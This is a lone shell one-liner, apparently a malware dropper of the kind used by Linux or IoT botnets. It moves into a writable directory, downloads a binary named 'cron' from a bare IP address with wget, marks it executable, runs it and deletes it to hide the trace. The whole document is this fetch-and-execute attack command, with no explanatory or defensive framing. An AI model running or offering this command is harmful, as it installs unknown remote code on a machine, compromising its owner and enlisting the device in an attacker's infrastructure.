cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.207.135.146/cron; chmod +x cron; ./cron; rm -rf cron
